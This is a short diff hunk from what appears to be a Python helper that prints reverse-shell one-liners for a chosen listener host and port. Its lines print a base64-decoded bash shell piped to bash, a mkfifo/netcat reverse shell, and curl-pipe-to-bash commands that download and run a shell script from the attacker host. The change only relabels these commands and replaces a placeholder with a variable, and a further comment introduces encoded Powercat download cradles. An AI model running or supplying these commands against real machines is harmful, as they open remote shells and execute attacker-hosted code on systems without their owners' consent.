@@ -74,9 +74,9 @@ def main():
     print(f"echo '{bash_shell_b64}' | base64 -d | bash\n")
     print(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f\n")
     print(f"[LOCAL]  echo '{bash_shell}' > shell.sh")
-    print("[TARGET] curl <OUR_IP>/shell.sh | /bin/bash\n")
-    print("[TARGET] curl <OUR_IP>/shell.sh -o /tmp/shell.sh")
-    print("[TARGET] /bin/bash /tmp/shell.sh")
+    print(f"[REMOTE] curl {lhost}/shell.sh | /bin/bash\n")
+    print(f"[REMOTE] curl {lhost}/shell.sh -o /tmp/shell.sh")
+    print("[REMOTE] /bin/bash /tmp/shell.sh")
 
     # Powercat cradles
     powercat_encoded = base64.b64encode(powercat.encode('utf-16le')).decode()
